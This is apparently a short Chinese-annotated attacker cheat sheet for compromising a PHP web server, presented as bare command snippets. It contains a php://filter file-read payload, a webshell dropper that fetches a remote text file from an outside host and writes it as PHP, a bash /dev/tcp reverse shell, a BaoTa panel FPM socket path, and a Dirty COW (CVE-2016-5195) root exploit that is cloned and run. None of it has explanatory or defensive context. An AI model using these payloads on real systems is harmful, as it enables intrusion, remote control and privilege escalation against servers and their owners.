```Bash
php://filter/read=convert.base64-encode/resource=/www/wwwroot/www.xxx.com/public/333.php
```
```Bash
echo '<pre>';var_dump(scandir('./'));
//base64
ZWNobyAnPHByZT4nO3Zhcl9kdW1wKHNjYW5kaXIoJy4vJykpOw==
```
```Bash
//getshell
file_put_contents("1234.php",file_get_contents("https://a.mxxxx.com/12345.txt"));
```
```Bash
//找可写入目录
echo copy("https://a.mxxxx.com/12345.txt","/home/www/blog/upload/xxx.php");
```
```Bash
//反弹shell
bash -i >& /dev/tcp/192.168.1.1/8080 0>&1
```
```Bash
//宝塔FPM
/tmp/php-cgi-56.sock
```
```Bash
//提权
//https://www.jianshu.com/p/df72d1ee1e3e
git clone https://github.com/gbonacini/CVE-2016-5195.git
cd CVE-2016-5195
./dcow -s
```
